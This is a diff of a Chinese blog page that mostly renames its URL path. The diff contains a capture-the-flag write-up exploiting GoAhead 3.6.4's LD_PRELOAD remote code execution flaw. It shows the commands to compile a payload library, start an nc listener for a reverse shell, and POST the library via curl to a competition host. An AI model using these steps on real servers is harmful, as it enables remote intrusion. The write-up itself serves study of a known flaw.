@@ -65,21 +65,21 @@
 <meta name="keywords" content="复现,WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="湖湘杯2019复现">
-<meta property="og:url" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/index.html">
+<meta property="og:url" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/index.html">
 <meta property="og:site_name" content="0xCreed">
 <meta property="og:description" content="太菜了，只能复现">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/image-20191109213839151.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/image-20191109214035812.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/image-20191109223215495.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/image-20191109222241231.png">
-<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/image-20191109222659969.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/image-20191109213839151.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/image-20191109214035812.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/image-20191109223215495.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/image-20191109222241231.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/image-20191109222659969.png">
 <meta property="og:updated_time" content="2019-11-09T14:32:50.551Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="湖湘杯2019复现">
 <meta name="twitter:description" content="太菜了，只能复现">
-<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/image-20191109213839151.png">
-  <link rel="canonical" href="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/">
+<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/image-20191109213839151.png">
+  <link rel="canonical" href="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/">
 
 
 <script id="page-configurations">
@@ -340,7 +340,7 @@
   
   
   <div class="post-block post">
-    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/">
+    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="0xCreed">
@@ -408,7 +408,7 @@
       
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2019/11/2019湖湘杯复现/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/11/2019湖湘杯复现/" itemprop="commentCount"></span></a>
+    <a title="valine" href="/2019/11/2019湖湘杯web复现/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/11/2019湖湘杯web复现/" itemprop="commentCount"></span></a>
   </span>
   
   
@@ -445,7 +445,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id><a href="#" class="headerlink" title></a></h2><p>打开<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">链接</a>,没什么东西。</p><p>查看源码</p><p><img src="/2019/11/2019湖湘杯复现/image-20191109213839151.png" alt="image-20191109213839151"></p><p>进入提示的页面</p><p><img src="/2019/11/2019湖湘杯复现/image-20191109214035812.png" alt="image-20191109214035812"></p><p>发现是GoAhead/3.6.4</p><p>百度了一下，发现 GoAhead 3.6.5之前的版本（2.5.0 – 3.6.4） 有个远程代码执行的漏洞</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。</p><a id="more"></a>
+        <h2 id><a href="#" class="headerlink" title></a></h2><p>打开<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">链接</a>,没什么东西。</p><p>查看源码</p><p><img src="/2019/11/2019湖湘杯web复现/image-20191109213839151.png" alt="image-20191109213839151"></p><p>进入提示的页面</p><p><img src="/2019/11/2019湖湘杯web复现/image-20191109214035812.png" alt="image-20191109214035812"></p><p>发现是GoAhead/3.6.4</p><p>百度了一下，发现 GoAhead 3.6.5之前的版本（2.5.0 – 3.6.4） 有个远程代码执行的漏洞</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，LD_开头的环境变量和动态链接库有关，如LD_PRELOAD中指定的动态链接库，将会被自动加载；LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库。</p><a id="more"></a>
 
 
 
@@ -461,17 +461,17 @@
 <p>编译动态库(注意和服务器环境相似)</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/2019湖湘杯复现/image-20191109223215495.png" alt="image-20191109223215495"></p>
+<p><img src="/2019/11/2019湖湘杯web复现/image-20191109223215495.png" alt="image-20191109223215495"></p>
 <p>会报错，但不影响使用</p>
 <p>服务器先监听1234端口</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/2019湖湘杯复现/image-20191109222241231.png" alt="image-20191109222241231"></p>
+<p><img src="/2019/11/2019湖湘杯web复现/image-20191109222241231.png" alt="image-20191109222241231"></p>
 <p>然后执行payload</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so http://183.129.189.62:13900/cgi-bin/index?LD_PRELOAD\=/proc/self/fd/0 -i | head</span><br></pre></td></tr></table></figure>
 
 <p>服务错误就多运行几次</p>
-<p><img src="/2019/11/2019湖湘杯复现/image-20191109222659969.png" alt="image-20191109222659969"></p>
+<p><img src="/2019/11/2019湖湘杯web复现/image-20191109222659969.png" alt="image-20191109222659969"></p>
 <p>得到flag</p>
 
     </div>
@@ -485,7 +485,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="\2019\11\2019红帽杯复现\" rel="bookmark">2019红帽杯复现</a></div>
+      <div class="popular-posts-title"><a href="\2019\11\2019红帽杯web复现\" rel="bookmark">2019红帽杯复现</a></div>
       
     </li>
   
@@ -501,7 +501,7 @@
     <strong>本文作者： </strong>0xCreed</li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/" title="湖湘杯2019复现">https://0xcreed.jxustctf.top/2019/11/2019湖湘杯复现/</a>
+    <a href="https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/" title="湖湘杯2019复现">https://0xcreed.jxustctf.top/2019/11/2019湖湘杯web复现/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -549,7 +549,7 @@
 
             <div class="post-nav-prev post-nav-item">
               
-                <a href="/2019/11/2019红帽杯复现/" rel="prev" title="2019红帽杯复现">
+                <a href="/2019/11/2019红帽杯web复现/" rel="prev" title="2019红帽杯复现">
                   2019红帽杯复现 <i class="fa fa-chevron-right"></i>
                 </a>
               
@@ -739,14 +739,14 @@
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">26k</span>
+    <span title="站点总字数">28k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">24 分钟</span>
+    <span title="站点阅读时长">25 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
   <span class="post-meta-divider">|</span>
